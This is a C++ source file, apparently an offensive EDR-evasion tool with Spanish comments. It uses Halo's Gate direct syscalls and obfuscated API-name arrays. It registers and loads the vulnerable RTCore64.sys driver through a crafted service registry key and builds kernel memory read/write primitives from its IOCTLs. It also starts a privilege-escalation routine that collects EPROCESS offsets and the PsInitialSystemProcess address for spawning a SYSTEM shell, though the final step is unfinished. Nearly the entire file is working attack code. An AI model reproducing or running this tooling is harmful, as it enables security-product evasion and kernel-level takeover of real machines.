// EvadeEDR.cpp : Este archivo contiene la función "main". La ejecución del programa comienza y termina ahí.
//

#include <Windows.h>
#include <iostream>
#include <vector>
#include <fstream>
#include <cstring>

#include <winternl.h>
#include <memory>

#include "DefsModule.h"

/*
*
* Ahora introduciremos el halo's gate
*
*/

extern "C" {

    EXTERN_C PVOID getntdll();

    EXTERN_C PVOID getExportTable(
        IN PVOID moduleAddr
    );

    EXTERN_C PVOID getExAddressTable(
        IN PVOID moduleExportTableAddr,
        IN PVOID moduleAddr
    );

    EXTERN_C PVOID getExNamePointerTable(
        IN PVOID moduleExportTableAddr,
        IN PVOID moduleAddr
    );

    EXTERN_C PVOID getExOrdinalTable(
        IN PVOID moduleExportTableAddr,
        IN PVOID moduleAddr
    );

    EXTERN_C PVOID getApiAddr(
        IN DWORD apiNameStringLen,
        IN LPSTR apiNameString,
        IN PVOID moduleAddr,
        IN PVOID ExExAddressTable,
        IN PVOID ExNamePointerTable,
        IN PVOID ExOrdinalTable
    );

    EXTERN_C DWORD findSyscallNumber(
        IN PVOID ntdllApiAddr
    );

    EXTERN_C DWORD halosGate(
        IN PVOID ntdllApiAddr,
        IN WORD index
    );

    EXTERN_C DWORD compExplorer(
        IN PVOID explorerWString
    );

    EXTERN_C WORD halosGateUp(PVOID addr, DWORD index);

    EXTERN_C WORD halosGateDown(PVOID addr, DWORD index);

    EXTERN_C VOID SetCall(WORD CallValue);
    EXTERN_C NTSTATUS CallFunc(...);
}

// =====================================================
#define print(fmt, ...)\
    printf(fmt "\n", ##__VA_ARGS__)


#define LOG_OK(fmt, ...)\
    print("[+] " fmt, ##__VA_ARGS__)

#define LOG_ERROR(fmt, ...)\
    print("[-] " fmt, ##__VA_ARGS__)

#define LOG_WARNING(fmt, ...)\
    print("[!] " fmt, ##__VA_ARGS__)

#define LOG_INFO(fmt, ...)\
    print("[*] " fmt, ##__VA_ARGS__)

// ======================================================

PVOID CopyMem(PVOID dest, const PVOID src, SIZE_T len)
{
    char* d = (char*)dest;
    const char* s = (const char*)src;
    if (d < s)
    {
        while (len--)
        {
            *d++ = *s++;
        }
    }
    else {
        const char* lasts = s + (len - 1);
        char* lastd = d + (len - 1);
        while (len--)
            *lastd-- = *lasts--;
    }
    return dest;
}


PVOID ntdllAddr = NULL;

PVOID ntdllExportTable = NULL;

PVOID ntdllExAddrTbl = NULL;

PVOID ntdllExNamePtrTbl = NULL;

PVOID ntdllExOrdinalTbl = NULL;


char letters[] = {
    'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '1', '2', '3', '4', '5', '6', '7', '8', '9', '0', '.'
};

// ====================================

BYTE nAllocMem[] = {
    39, 19, 26, 11, 11, 14, 2, 0, 19, 4, 47, 8, 17, 19, 20, 0, 11, 38, 4, 12, 14, 17, 24
};


BYTE nProtectMem[] = {
    39, 19, 41, 17, 14, 19, 4, 2, 19, 47, 8, 17, 19, 20, 0, 11, 38, 4, 12, 14, 17, 24
};

BYTE nCreateTh[] = {
    39, 19, 28, 17, 4, 0, 19, 4, 45, 7, 17, 4, 0, 3, 30, 23
};
BYTE nWaitObj[] = {
    39, 19, 48, 0, 8, 19, 31, 14, 17, 44, 8, 13, 6, 11, 4, 40, 1, 9, 4, 2, 19
};

BYTE nFreeMem[] = {
    39, 19, 31, 17, 4, 4, 47, 8, 17, 19, 20, 0, 11, 38, 4, 12, 14, 17, 24
};

// NtOpenKey
BYTE nOpenKey[] =
{
    39, 19, 40, 15, 4, 13, 36, 4, 24
};

// NtCreateKey
BYTE nCreateKey[] = {
    39, 19, 28, 17, 4, 0, 19, 4, 36, 4, 24
};

// NtSetValueKey
BYTE nSetKeyVal[] = {
    39, 19, 44, 4, 19, 47, 0, 11, 20, 4, 36, 4, 24
};

// NtOpenProcessToken
BYTE nOpenToken[] = {
    39, 19, 40, 15, 4, 13, 41, 17, 14, 2, 4, 18, 18, 45, 14, 10, 4, 13
};

// NtAdjustPrivilegesToken
BYTE nAdjustPrivs[] = {
    39, 19, 26, 3, 9, 20, 18, 19, 41, 17, 8, 21, 8, 11, 4, 6, 4, 18, 45, 14, 10, 4, 13
};

// NtLoadDriver
BYTE nLoadDriver[] = {
    39, 19, 37, 14, 0, 3, 29, 17, 8, 21, 4, 17
};

// NtUnloadDriver
BYTE nUnloadDriver[] = {
    39, 19, 46, 13, 11, 14, 0, 3, 29, 17, 8, 21, 4, 17
};


// NtQueryValueKey
BYTE nQueryKeyVal[] = {
    39, 19, 42, 20, 4, 17, 24, 47, 0, 11, 20, 4, 36, 4, 24
};

// NtQuerySystemInformation
BYTE nQuerySysInfo[] = {
    39, 19, 42, 20, 4, 17, 24, 44, 24, 18, 19, 4, 12, 34, 13, 5, 14, 17, 12, 0, 19, 8, 14, 13
};

// NtDeviceIoControlFile
BYTE nDeviceIoControl[] =
{
    39, 19, 29, 4, 21, 8, 2, 4, 34, 14, 28, 14, 13, 19, 17, 14, 11, 31, 8, 11, 4
};

// NtCreateFile
BYTE nCreateFile[] =
{
    39, 19, 28, 17, 4, 0, 19, 4, 31, 8, 11, 4
};

// =====================================

// ntoskrnl.exe
BYTE nNtosModule[] = {
    13, 19, 14, 18, 10, 17, 13, 11, 62, 4, 23, 4
};

BYTE nPsInitialSysProc[] =
{
    41, 18, 34, 13, 8, 19, 8, 0, 11, 44, 24, 18, 19, 4, 12, 41, 17, 14, 2, 4, 18, 18
};

// ===================================== Global Structs

funStruct sDeviceIoControl;

// =====================================

static const DWORD RTCORE64_MSR_READ_CODE = 0x80002030;
static const DWORD RTCORE64_MEMORY_READ_CODE = 0x80002048;
static const DWORD RTCORE64_MEMORY_WRITE_CODE = 0x8000204c;

// =====================================

DWORD ReadMemoryPrimitive(HANDLE Device, DWORD Size, DWORD64 Address) {
    RTCORE64_MEMORY_READ MemoryRead{};
    MemoryRead.Address = Address;
    MemoryRead.ReadSize = Size;

    DWORD BytesReturned;

    DeviceIoControl(Device,
        RTCORE64_MEMORY_READ_CODE,
        &MemoryRead,
        sizeof(MemoryRead),
        &MemoryRead,
        sizeof(MemoryRead),
        &BytesReturned,
        nullptr);

    return MemoryRead.Value;
}

void WriteMemoryPrimitive(HANDLE Device, DWORD Size, DWORD64 Address, DWORD Value) {
    RTCORE64_MEMORY_READ MemoryRead{};
    MemoryRead.Address = Address;
    MemoryRead.ReadSize = Size;
    MemoryRead.Value = Value;

    DWORD BytesReturned;

    DeviceIoControl(Device,
        RTCORE64_MEMORY_WRITE_CODE,
        &MemoryRead,
        sizeof(MemoryRead),
        &MemoryRead,
        sizeof(MemoryRead),
        &BytesReturned,
        nullptr);
}

WORD ReadMemoryWORD(HANDLE Device, DWORD64 Address) {
    return ReadMemoryPrimitive(Device, 2, Address) & 0xffff;
}

DWORD ReadMemoryDWORD(HANDLE Device, DWORD64 Address) {
    return ReadMemoryPrimitive(Device, 4, Address);
}

DWORD64 ReadMemoryDWORD64(HANDLE Device, DWORD64 Address) {
    return (static_cast<DWORD64>(ReadMemoryDWORD(Device, Address + 4)) << 32) | ReadMemoryDWORD(Device, Address);
}

void WriteMemoryDWORD64(HANDLE Device, DWORD64 Address, DWORD64 Value) {
    WriteMemoryPrimitive(Device, 4, Address, Value & 0xffffffff);
    WriteMemoryPrimitive(Device, 4, Address + 4, Value >> 32);
}

// =====================================

VOID SetUnicodeString(PUNICODE_STRING DestinationString, PCWSTR SourceString) {
    if (SourceString == nullptr) {
        DestinationString->Length = 0;
        DestinationString->MaximumLength = 0;
        DestinationString->Buffer = nullptr;
    }
    else {
        size_t size = wcslen(SourceString) * sizeof(WCHAR);
        DestinationString->Length = static_cast<USHORT>(size);
        DestinationString->MaximumLength = static_cast<USHORT>(size + sizeof(WCHAR));
        DestinationString->Buffer = const_cast<PWSTR>(SourceString);
    }
}

BOOL CheckDrvrLoad()
{
    BOOL ret = TRUE;

    HANDLE hDevice = CreateFileW(
        L"\\\\.\\RTCore64",
        GENERIC_READ | GENERIC_WRITE,
        0,
        NULL,
        OPEN_EXISTING,
        0,
        NULL
    );
    if (hDevice != INVALID_HANDLE_VALUE) {
        CloseHandle(hDevice);
    }
    else {
        ret = FALSE;
    }

    return ret;
}

// =====================================
VOID getWord(char* dst, PBYTE clave, SIZE_T size)
{
    for (size_t i = 0; i < size; i++)
    {
        dst[i] = letters[clave[i]];
    }
}

BOOL init_program()
{

    ntdllAddr = getntdll();

    if (!ntdllAddr)
    {
        LOG_ERROR("Direccion no encontrada ntdllAddr");
        return FALSE;
    }

    ntdllExportTable = getExportTable(ntdllAddr);

    if (!ntdllExportTable)
    {
        LOG_ERROR("Direccion no encontrada ntdllExportTable");
        return FALSE;
    }

    ntdllExAddrTbl = getExAddressTable(ntdllExportTable, ntdllAddr);

    if (!ntdllExAddrTbl)
    {
        LOG_ERROR("Direccion no encontrada ntdllExAddrTbl");
        return FALSE;
    }

    ntdllExNamePtrTbl = getExNamePointerTable(ntdllExportTable, ntdllAddr);

    if (!ntdllExNamePtrTbl)
    {
        LOG_ERROR("Direccion no encontrada ntdllExNamePtrTbl");
        return FALSE;
    }

    ntdllExOrdinalTbl = getExOrdinalTable(ntdllExportTable, ntdllAddr);


    if (!ntdllExOrdinalTbl)
    {
        LOG_ERROR("Direccion no encontrada ntdllExOrdinalTbl");
        return FALSE;
    }

    return TRUE;
}

BOOL get_numSys(pfunStruct structFunction)
{
    if (!ntdllAddr || !ntdllExAddrTbl || !ntdllExNamePtrTbl || !ntdllExOrdinalTbl || !structFunction->name)
    {
        return FALSE;
    }

    size_t strSize = structFunction->size;

    if (strSize > 127)
    {
        LOG_ERROR("El tamano del nombre de la funcion es demasiado grande");
        return FALSE;
    }

    char fn[127] = { 0 };

    for (size_t i = 0; i < strSize; i++)
    {
        fn[i] = letters[structFunction->name[i]];
    }

    LOG_INFO("Funcion a buscar: %s", fn);

    PVOID addr = getApiAddr(
        strSize,
        fn,
        ntdllAddr,
        ntdllExAddrTbl,
        ntdllExNamePtrTbl,
        ntdllExOrdinalTbl
    );

    WORD number = findSyscallNumber(addr);

    if (number)
    {
        LOG_OK("Valor de numerico de %s es %d", fn, number);
        structFunction->sysnum = number;
        return TRUE;
    }

    DWORD index = 0;

    while (number == 0) {
        index++;

        number = halosGateUp(addr, index);

        if (number) {
            number = number - index;
            break;
        }

        number = halosGateDown(addr, index);

        if (number) {
            number = number + index;
            break;
        }
    }

    LOG_OK("Valor de numerico de %s es %d", fn, number);
    structFunction->sysnum = number;

    return TRUE;
}

// Conseguir ubicacion
BOOL getPath(WCHAR* completePath)
{
    if (!GetModuleFileNameW(NULL, completePath, MAX_PATH))
        return FALSE;

    WCHAR* lastSlash = wcsrchr(completePath, L'\\');
    if (!lastSlash)
        return FALSE;

    *(lastSlash + 1) = L'\0';

    wcscat_s(completePath, MAX_PATH, L"RTCore64.sys");

    WCHAR tmp[MAX_PATH];
    swprintf_s(tmp, MAX_PATH, L"\\??\\%ls", completePath);

    wcscpy_s(completePath, MAX_PATH, tmp);

    return TRUE;
}

// Get privilege
BOOL getPrivs(DWORD rid)
{
    HANDLE hToken;
    TOKEN_PRIVILEGES tp;

    LUID luid;
    luid.HighPart = 0;
    luid.LowPart = rid;

    funStruct sOpenTkn;
    sOpenTkn.name = nOpenToken;
    sOpenTkn.size = sizeof(nOpenToken);

    if (!get_numSys(&sOpenTkn))
    {
        LOG_ERROR("No se obtuvo stub de open token");
        return FALSE;
    }

    SetCall(sOpenTkn.sysnum);
    NTSTATUS status = CallFunc(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken);

    if (status)
    {
        LOG_ERROR("No se obtuvo el token. E: 0x%08x", status);
    }

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    funStruct sAdjustPrivs;
    sAdjustPrivs.name = nAdjustPrivs;
    sAdjustPrivs.size = sizeof(nAdjustPrivs);

    if (!get_numSys(&sAdjustPrivs))
    {
        LOG_ERROR("No se obtuvo stub de open token");
        CloseHandle(hToken);
        return FALSE;
    }

    SetCall(sAdjustPrivs.sysnum);
    status = CallFunc(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);

    if (status)
    {
        LOG_ERROR("Error en ejecucion de funcion de AdjsPrivsToken");
        CloseHandle(hToken);
        return FALSE;
    }

    LOG_OK("Valor de Token ajustado");

    CloseHandle(hToken);

    return TRUE;
}

// Write Reg
BOOL WriteReg()
{
    NTSTATUS status = 0;

    // NtCreateKey
    funStruct sCreateKey;
    sCreateKey.name = nCreateKey;
    sCreateKey.size = sizeof(nCreateKey);

    if (!get_numSys(&sCreateKey)) {
        return FALSE;
    }

    HANDLE hKey; 

    ULONG disposition = 0;

    const WCHAR registryPath[] = L"\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Services\\Rtcore";

    UNICODE_STRING keyName;

    keyName.Buffer = (PWSTR)registryPath;

    keyName.Length = sizeof(registryPath) - sizeof(WCHAR);

    keyName.MaximumLength = sizeof(registryPath);

    // Attributes ======

    OBJECT_ATTRIBUTES objAttr;
    InitializeObjectAttributes(
        &objAttr,
        &keyName,                // Ruta de la clave en formato NT
        OBJ_CASE_INSENSITIVE,    // El registro no distingue mayúsculas/minúsculas
        NULL,                    // No se usa con rutas absolutas
        NULL                     // No se requiere descriptor de seguridad aquí
    );

    // ==========================================================

    SetCall(sCreateKey.sysnum);

    status = CallFunc(
        &hKey,
        KEY_ALL_ACCESS,
        &objAttr,
        0,
        NULL,
        REG_OPTION_NON_VOLATILE,
        &disposition
    );

    if (status != 0)
    {
        LOG_ERROR("No se pudo crear la llave. E: %d", status);

        return FALSE;
    }

    if (disposition == REG_CREATED_NEW_KEY)
    {
        LOG_OK("Llave creada exitosamente");
    }
    else if (disposition == REG_OPENED_EXISTING_KEY)
    {
        LOG_INFO("Clave ya creada, se ha abierto");
    }

    funStruct sSetKeyVal;
    sSetKeyVal.name = nSetKeyVal;
    sSetKeyVal.size = sizeof(nSetKeyVal);

    if (!get_numSys(&sSetKeyVal))
    {
        CloseHandle(hKey);
        return FALSE;
    }

    // ===================================================

    UNICODE_STRING uImagePathName;
    UNICODE_STRING uTypeName;
    UNICODE_STRING uStartName;
    UNICODE_STRING uErrorControlName;

    SetUnicodeString(&uImagePathName, L"ImagePath");
    SetUnicodeString(&uTypeName, L"Type");
    SetUnicodeString(&uStartName, L"Start");
    SetUnicodeString(&uErrorControlName, L"ErrorControl");

    // =======================================================

    WCHAR imagePath[MAX_PATH] = {0};


    if (!getPath(imagePath))
    {
        return FALSE;
    }

    LOG_INFO("Ubicacion de Drvr: %ls", imagePath);

    DWORD dataType = REG_SZ;
    ULONG dataSize = (ULONG)((wcslen(imagePath) + 1) * sizeof(WCHAR));

    SetCall(sSetKeyVal.sysnum);
    status = CallFunc(
        hKey,
        &uImagePathName,
        0,
        dataType,
        (PVOID)imagePath,
        dataSize
    );


    if (status != 0) {
        LOG_ERROR("Error al escribir ImagePath: 0x%08x", status);
        CloseHandle(hKey);
        return FALSE;
    }

    DWORD typeVal = SERVICE_KERNEL_DRIVER;
    dataType = REG_DWORD;
    dataSize = sizeof(DWORD);
    SetCall(sSetKeyVal.sysnum);
    status = CallFunc(
        hKey,
        &uTypeName,
        0,
        dataType,
        (PVOID)&typeVal,
        dataSize
    );

    if (status != 0) {
        LOG_ERROR("Error al escribir type: 0x%08x", status);
        CloseHandle(hKey);
        return FALSE;
    }


    DWORD startVal = SERVICE_DEMAND_START;
    SetCall(sSetKeyVal.sysnum);
    status = CallFunc(
        hKey,
        &uStartName,
        0,
        REG_DWORD,
        (PVOID)&startVal,
        sizeof(DWORD)
    );


    if (status != 0) {
        LOG_ERROR("Error al escribir startVal: 0x%08x", status);
        CloseHandle(hKey);
        return FALSE;
    }


    DWORD errorCtrlVal = SERVICE_ERROR_NORMAL;
    SetCall(sSetKeyVal.sysnum);
    status = CallFunc(
        hKey,
        &uErrorControlName,
        0,
        REG_DWORD,
        (PVOID)&errorCtrlVal,
        sizeof(DWORD)
    );


    if (status != 0) {
        LOG_ERROR("Error al escribir errorCtrlService: 0x%08x", status);
        CloseHandle(hKey);
        return FALSE;
    }


    LOG_OK("Se escribio por completo el Servicio");

    CloseHandle(hKey);


    return TRUE;
}

// Load driver
BOOL LoadDrv()
{
    if (!WriteReg())
    {
        return FALSE;
    }

    if (!getPrivs(LOAD_DRIVER_PRIV))
    {
        LOG_ERROR("No se ajustaron los privilegios");
        return FALSE;
    }

    NTSTATUS status = 0;

    UNICODE_STRING driverServicePath;
    SetUnicodeString(&driverServicePath, L"\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Services\\Rtcore");

    funStruct sLoadDrvr;
    sLoadDrvr.name = nLoadDriver;
    sLoadDrvr.size = sizeof(nLoadDriver);

    if (!get_numSys(&sLoadDrvr))
    {
        LOG_ERROR("Error al obtener el stub de LoadDrvr");
        return FALSE;
    }

    SetCall(sLoadDrvr.sysnum);
    status = CallFunc(&driverServicePath);

    if (status == 0)
    {
        LOG_OK("Drvr cargado");
    }
    else if (status == 0xc000010e)
    {
        LOG_INFO("Ya se encuentra cargado");
    }
    else
    {
        LOG_ERROR("El Drvr no cargo. E: 0x%08x", status);
        return FALSE;
    }

    if (CheckDrvrLoad()) {
        LOG_OK("Objeto de Drvr encontrado");
    }

    return TRUE;
}

// ================================================================

// Unload driver
BOOL UnloadDrv()
{
    if (!CheckDrvrLoad())
    {
        LOG_OK("No se encuentra el drvr");
    }

    if (!getPrivs(LOAD_DRIVER_PRIV))
    {
        LOG_ERROR("No se ajustaron los privilegios");
        return FALSE;
    }

    NTSTATUS status = 0;

    UNICODE_STRING driverServicePath;
    SetUnicodeString(&driverServicePath, L"\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Services\\Rtcore");

    funStruct sUnloadDrvr;
    sUnloadDrvr.name = nUnloadDriver;
    sUnloadDrvr.size = sizeof(nUnloadDriver);

    if (!get_numSys(&sUnloadDrvr))
    {
        LOG_ERROR("Error al obtener el stub de LoadDrvr");
        return FALSE;
    }

    SetCall(sUnloadDrvr.sysnum);
    status = CallFunc(&driverServicePath);

    if (status == 0) {
        LOG_OK("Unload Drvr exitoso");
    }
    else
    {
        LOG_ERROR("Unload drvr fail. Error: 0x%08x", status);
        return FALSE;
    }

    if (!CheckDrvrLoad())
    {
        LOG_OK("Ya no existe el Drvr");
    }

    return TRUE;
}

// ================================================================

// Show help
VOID showHelp()
{
    printf("Los comandos son los siguientes: \n\
            \t1) load     - Comando para cargar drv\n\
            \t2) unload   - Comando para quitar drv\n\
            \t3) cmd      - Obtain CMD\n\
        Opcion: ");
}

//=================================================================

// First Get Windows Version
struct Offsets getOffs()
{
    funStruct sOpenKey;
    sOpenKey.name = nOpenKey;
    sOpenKey.size = sizeof(nOpenKey);

    // Get Stub
    if (!get_numSys(&sOpenKey))
    {
        LOG_ERROR("No se pudo obtener el numero de Open Key");
        return Offsets{ 0, 0 , 0 };
    }

    HANDLE hKey;

    NTSTATUS status = 0;

    const WCHAR registryPath[] = L"\\Registry\\Machine\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion";

    UNICODE_STRING keyName;

    keyName.Buffer = (PWSTR)registryPath;

    keyName.Length = sizeof(registryPath) - sizeof(WCHAR);

    keyName.MaximumLength = sizeof(registryPath);

    // Attributes ======

    OBJECT_ATTRIBUTES objAttr;
    InitializeObjectAttributes(
        &objAttr,
        &keyName,                
        OBJ_CASE_INSENSITIVE,    
        NULL,                    
        NULL                     
    );

    // ===== Open key

    SetCall(sOpenKey.sysnum);
    status = CallFunc(&hKey, KEY_READ, &objAttr);

    if (status != 0)
    {
        LOG_ERROR("Error al abrir la llave. E: 0x%8x", status);
        return Offsets{ 0, 0 , 0 };
    }

    LOG_OK("Obteniendo valor de llave de registro");

    // Now get the value

    funStruct sQueryValKey;
    sQueryValKey.name = nQueryKeyVal;
    sQueryValKey.size = sizeof(nQueryKeyVal);

    // Get Stub
    if (!get_numSys(&sQueryValKey))
    {
        LOG_ERROR("No se pudo obtener el numero de Query Val Key");
        return Offsets{ 0, 0 , 0 };
    }

    UNICODE_STRING valueName;
    SetUnicodeString(&valueName, L"ReleaseId");

    const ULONG initialBufferSize = 1024;
    auto buffer = std::make_unique<BYTE[]>(initialBufferSize);
    ULONG resultLength = 0;

    SetCall(sQueryValKey.sysnum);
    status = CallFunc(hKey, &valueName, KeyValuePartialInformation, buffer.get(), initialBufferSize, &resultLength);

    if (status != 0)
    {
        LOG_ERROR("Error leyendo valor de llave. E: 0x%8x", status);
        CloseHandle(hKey);
        return Offsets{ 0,0,0 };
    }

    LOG_OK("Se leyo buffer de ReleaseId");

    auto info = reinterpret_cast<PKEY_VALUE_PARTIAL_INFORMATION>(buffer.get());

    auto strData = reinterpret_cast<PWSTR>(info->Data);

    LOG_OK("Version de releaseId: %ls", strData);

    CloseHandle(hKey);

    auto wV = _wtoi(strData);

    switch (wV) {
    case 1607:
        return Offsets{ 0x02e8, 0x02f0, 0x0358 };
    case 1803:
    case 1809:
        return Offsets{ 0x02e0, 0x02e8, 0x0358 };
    case 1903:
    case 1909:
        return Offsets{ 0x02e8, 0x02f0, 0x0360 };
    case 2004:
    case 2009:
        return Offsets{ 0x0440, 0x0448, 0x04b8 };

    default:
        LOG_ERROR("Esa version no esta definida");
    }

    return Offsets{ 0,0,0 };
}

// Get the kernel base address
PVOID ntosKnlBase()
{
    funStruct sQuerySysInfo;
    sQuerySysInfo.name = nQuerySysInfo;
    sQuerySysInfo.size = sizeof(nQuerySysInfo);

    // ==== Buscamos la info ===

    if (!get_numSys(&sQuerySysInfo))
    {
        return NULL;
    }

    if (!getPrivs(DEBUG_PRIV)) {
        return NULL;
    }

    NTSTATUS status = 0;
    ULONG bufferSize = 0;

    SetCall(sQuerySysInfo.sysnum);
    status = CallFunc(SystemModuleInformation, nullptr, 0, &bufferSize);

    if (status != 0xC0000004)
    {
        LOG_ERROR("No se obtuvo la informacion. E: 0x%8x", status);
        return NULL;
    }

    std::vector<BYTE> buffer(bufferSize); 

    SetCall(sQuerySysInfo.sysnum);
    status = CallFunc(SystemModuleInformation, buffer.data(), bufferSize, &bufferSize);

    if (status)
    {
        LOG_ERROR("No se pudo obtener la informacion del sistema. E: 0x%8x", status);
        return NULL;
    }

    auto pModuleInfo = reinterpret_cast<PRTL_PROCESS_MODULES>(buffer.data());

    if (pModuleInfo->NumberOfModules > 0)
    {
        PVOID krnlBase = pModuleInfo->Modules[0].ImageBase;

        LOG_OK("La direccion de kernel %p", krnlBase);
        LOG_OK("Nombre de Modulo %s", pModuleInfo->Modules[0].ImageName);

        return krnlBase;
    }

    return NULL;

}

// Get SysAddress
DWORD64 GetPsSysAddress() {

    char ntosword[254] = { 0 };

    char psInitialWord[254] = { 0 };

    getWord(ntosword, nNtosModule, sizeof(nNtosModule));
    getWord(psInitialWord, nPsInitialSysProc, sizeof(nPsInitialSysProc));

    LOG_INFO("Kernel: %s", ntosword);
    LOG_INFO("Function: %s", psInitialWord);

    HMODULE NtosKnl = LoadLibraryA(ntosword);

    if (!NtosKnl)
    {
        return 0;
    }

    DWORD64 psInitialSystemOffs = reinterpret_cast<DWORD64>(GetProcAddress(NtosKnl, psInitialWord)) - reinterpret_cast<DWORD64>(NtosKnl);

    FreeLibrary(NtosKnl);

    return psInitialSystemOffs;

}

// Spawn de CMD
BOOL GetCMD()
{
    if (!CheckDrvrLoad())
    {
        LOG_ERROR("El dvr no esta cargado");
        return FALSE;
    }

    Offsets offs = getOffs();

    if (offs.APLinksOffset == 0 && offs.TOffset == 0 && offs.UPIdOffset == 0)
    {
        LOG_ERROR("No se obtuvieron los offsets");
        return FALSE;
    }

    PVOID knlBase = ntosKnlBase();

    if (!knlBase)
    {
        LOG_ERROR("No se obtuvo la direccion");
        return FALSE;
    }

    DWORD64 addressPsInitialSys = GetPsSysAddress();

    if (!addressPsInitialSys)
    {
        LOG_ERROR("No se obtuvo direccion de PsInitialSystemInfo");
        return FALSE;
    }

    LOG_OK("Direccion obtenida 0x%llx", addressPsInitialSys);

    // Abrimos Handle



    return TRUE;
}

// Entry Point
int main()
{

    LOG_INFO("Comenzando Halo's Gate...");

    if (!init_program())
    {
        return -1;
    }

    showHelp();

    DWORD option = 0; 

    std::cin >> option;

    switch (option)
    {
    case 1:
        // LoadDrvr
        if (!LoadDrv())
        {
            return -1;
        }
        break;

        

        // UnloadDrv
    case 2:
        if (!UnloadDrv())
        {
            return -1;
        }
        break;



        // Get CMD
    case 3:
        if (!GetCMD())
        {
            return -1;
        }
        break;


    default:
        break;
    }

    return 0;

}